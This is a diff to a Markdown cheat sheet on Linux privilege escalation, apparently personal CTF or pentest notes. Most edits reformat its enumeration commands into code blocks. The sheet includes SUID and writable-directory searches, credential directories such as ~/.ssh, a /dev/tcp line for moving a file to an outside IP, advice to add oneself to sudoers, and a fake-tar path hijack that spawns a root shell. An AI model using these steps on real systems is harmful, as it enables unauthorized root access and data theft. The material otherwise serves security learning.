@@ -1,53 +1,92 @@
 # Linux
-Everything to check when trying to become root
-
+Everything to check for when trying to become root
 
 # Commands
 ## Basic info
-- `sudo -l`
-- `ps aux | grep <user>`
-- `w` --> Displays each logged in user and shows their activity
-- `groups` --> Shows all the groups that a user is in. *(Check for unusual groups)*
-- `(env || set) 2>/dev/null` --> Shows environment variables
+```bash
+# List privileges for the current user
+sudo -l
+
+# See all running processes
+ps aux
+
+# Shows user activity
+w
+
+# Shows groups
+groups
+
+# Environment variables
+(env || set) 2>/dev/null
+```
+
 
 ## Directories and files
-- `ls - ltrh` --> sort files by latest update (the one that is close to you by date, could be important)
-- `find / -writable -type d 2>/dev/null`
-- `find / -perm -4000 2>/dev/null`
+```bash
+# Sort files by date
+ls - ltrh
+
+# Writeable folders
+find / -writable -type d 2>/dev/null
+
+# Find SUID files
+find / -perm -4000 2>/dev/null
+```
+
 
 ## Network
-- `(netstat -punta || ss --ntpu)` --> Open ports
+```bash
+# Open ports
+(netstat -punta || ss --ntpu)
+```
 
 ## Misc
-- `kill -9 <pid>`
-- `cat /sys/class/graphics/fb0/virtual_size` --> Shows the screen resolution.
-- `blkid` --> Determines the type of content (e.g. filesystem, swap) a block device holds.
-    - Check [this](https://linux.die.net/man/8/blkid) link for more.
-- [`debugfs`](./linux.md#debugfs)
-- `ltrace`
+```bash
+# Kills process
+kill -9 <pid>
 
-*Check out [this script](https://gist.github.com/IVBecy/fa31bb1e268b7709b79764614a97a79f) for ease of use*
+# Screen res
+cat /sys/class/graphics/fb0/virtual_size
 
-# Directories
-- ~/
-- ~/.ssh
-- /tmp
-- /dev/shm
-- /opt
-- /var
-- /usr
-- /etc/apache2 *(if a site is live)*
-    - /etc/apache2/site-enabled
+# Determines the types of content that a block device holds (https://linux.die.net/man/8/blkid)
+blkid
 
-# Useful linux programs,tools and commands
-- `jq`` --> Makes json data readable   
-    ```bash
-    cat <json_file> | jq
-    ```
-- `cat /proc/net/fib_trie` --> Shows network topology
-- `hostname` --> Shows domain name
-- `/etc/os-release` --> OS info and release
-- `cat <file> /dev/tcp/<ip>/<port>` --> Download file from shell session
+# Runs program until exit and intercepts dynamic library calls
+ltrace or strace
+```
+
+# Directories to check
+```bash
+~/
+~/.ssh
+/tmp
+/dev/shm
+/opt
+/var
+/usr
+# if a site is live
+/etc/apache2 
+/etc/apache2/site-enabled
+```
+
+
+# Useful linux programs, tools and commands
+```bash
+# Human readable JSON data (jq)
+cat <json_file> | jq
+
+# Shows network topology
+cat /proc/net/fib_trie
+
+# Domain name
+hostname
+
+# OS info
+/etc/os-release
+
+# Download file from shell session
+cat <file> /dev/tcp/<ip>/<port>
+```
 
 
 # Analysis tools
@@ -75,12 +114,9 @@ read myvar
 Note: Here one can insert malicious code to be executed by the program.
 
 
-
 # Binaries (file read and write)
-- If a gven binary allows you to edit files and one's not yet root, the attacker can try to edit the **sudoers** file and put the user in there, hence gaining root privs.      
+- If a given binary allows you to edit files and one's not yet root, the attacker can try to edit the **sudoers** file and put the user in there, hence gaining root privs.      
 - Also, maybe try copying the original file and add yourself to it and replace the original file with the altered version.
-
-
 
 # Processes / Buses
 
@@ -167,5 +203,3 @@ This example can be modified and used for other cases.
     bash
     ```
 Once the original program executes in the directory, it will run our tar program and spawn a root shell.
-
-
